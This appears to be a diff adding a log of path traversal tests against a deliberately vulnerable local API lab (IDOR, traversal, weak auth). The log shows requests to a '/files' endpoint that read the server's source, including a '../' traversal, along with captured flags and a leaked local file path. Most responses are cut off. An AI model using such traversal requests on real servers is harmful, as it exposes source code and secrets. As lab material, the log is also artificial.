@@ -1,0 +1,9 @@
+== /files 路径穿越（读服务端源码，确认常量与校验缺陷）==
+--- 1) name=server.py
+{"name": "server.py", "content": "#!/usr/bin/env python3\n\"\"\"Local API lab: IDOR + path traversal + weak auth. 127.0.0.1:18081 only.\"\"\"\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import urlparse, parse_qs, unquote\nimport json, base64, os\n\nPORT = 18081\nUS
+--- 2) 关键行提取（由 /files 返回内容中 grep）
+1:{"name": "server.py", "content": "#!/usr/bin/env python3n"""Local API lab: IDOR + path traversal + weak auth. 127.0.0.1:18081 only."""nfrom http.server import BaseHTTPRequestHandler, HTTPServernfrom urllib.parse import urlparse, parse_qs, unquotenimport json, base64, osnnPORT = 18081nUSERS = {n    "1": {"role": "user", "name": "alice"},n    "2": {"role": "admin", "name": "bob"},n}nNOTES = {n    "1": "alice-note",n    "2": "admin-secret-FLAG{idor_user2}",n}nFLAG = "FLAG{api_chain_ok}"nnndef b64json(o: dict) -> str:n    return bas"}
+--- 3) ../ 穿越
+{"name": "../weblab-api/server.py", "content": "#!/usr/bin/env python3\n\"\"\"Local API lab: IDOR + path traversal + weak auth. 127.0.0.1:18081 only.\"\"\"\nfro
+--- 4) 负对照: 不存在文件
+{"error": "[Errno 2] No such file or directory: 'C:\\\\Users\\\\Administrator\\\\Documents\\\\GitHub\\\\helm-pi\\\\labs\\\\weblab-api\\\\nope.txt'"}
